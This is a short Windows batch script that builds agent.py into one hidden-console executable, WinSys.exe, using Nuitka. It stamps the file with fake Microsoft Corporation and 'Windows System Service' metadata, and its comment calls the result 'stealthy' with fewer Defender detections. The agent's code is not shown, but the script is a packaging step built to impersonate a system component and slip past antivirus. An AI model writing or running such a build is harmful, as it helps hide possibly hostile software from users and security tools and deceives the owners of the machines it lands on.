@echo off
REM Build a single stealthy exe. Nuitka -> fewer Defender false positives.
pip install -r requirements.txt

python -m nuitka ^
  --onefile ^
  --windows-disable-console ^
  --output-filename=WinSys.exe ^
  --company-name="Microsoft Corporation" ^
  --product-name="Windows System Service" ^
  --file-description="Windows System Service" ^
  --file-version=10.0.0.1 ^
  --product-version=10.0.0.1 ^
  --assume-yes-for-downloads ^
  --output-dir=build ^
  agent.py

echo.
echo Done -^> build\WinSys.exe
pause